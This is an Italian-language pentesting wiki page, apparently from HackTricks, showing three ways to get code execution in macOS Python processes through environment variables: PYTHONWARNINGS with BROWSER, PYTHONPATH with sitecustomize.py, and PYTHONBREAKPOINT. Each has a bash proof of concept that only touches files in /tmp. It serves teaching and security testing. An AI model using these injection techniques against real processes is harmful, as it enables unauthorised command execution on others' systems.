# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

Se un attacker può controllare l'ambiente di un processo Python, la combinazione di `PYTHONWARNINGS` e `BROWSER` può attivare la command execution quando Python importa il modulo `antigravity` durante l'elaborazione di un'opzione di warning appositamente elaborata. La tecnica si basa sul fatto che `antigravity` apra un URL con il modulo `webbrowser` di Python, che rispetta la variabile d'ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Tramite `PYTHONPATH` e `sitecustomize.py`

Durante l'avvio normale, il modulo Python `site` aggiunge i percorsi specifici del sito e quindi tenta di importare un modulo denominato `sitecustomize`. Posizionando una directory leggibile dall'attacker all'inizio di `PYTHONPATH`, un attacker che controlla l'ambiente del processo può fare in modo che Python importi un payload prima dello script target. Il flag `-S` disabilita l'inizializzazione automatica di `site`, mentre la modalità isolata (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Tramite `PYTHONBREAKPOINT`

A partire da Python 3.7 (PEP 553), il `breakpoint()` integrato importa e chiama qualunque oggetto punti a `sys.breakpointhook`, e tale destinazione viene ricavata dalla variabile d'ambiente **`PYTHONBREAKPOINT`** (`package.module.callable`). L'importazione del modulo indicato e la chiamata dell'oggetto eseguibile avvengono entrambe prima che il debugger venga normalmente visualizzato; pertanto, un attacker che controlla l'ambiente di un processo che raggiunge un `breakpoint()` (caso comune negli script di manutenzione/debug e talvolta lasciato nei percorsi di produzione) ottiene code execution.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
A differenza di `PYTHONWARNINGS`/`PYTHONPATH`, questo richiede che il target raggiunga effettivamente una chiamata a `breakpoint()`, ma funziona anche esclusivamente tramite gli **effetti collaterali dell'importazione** del modulo indicato (indicarlo verso qualsiasi modulo importabile — ad esempio uno posizionato per primo in `PYTHONPATH` — il cui livello superiore esegua codice). Impostando `PYTHONBREAKPOINT=0` si disabilita completamente l'hook.

## References

- [1] [Hacking con le variabili d'ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook di configurazione specifico del sito](https://docs.python.org/3/library/site.html)
- [3] [Python: riga di comando e ambiente](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() integrato e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
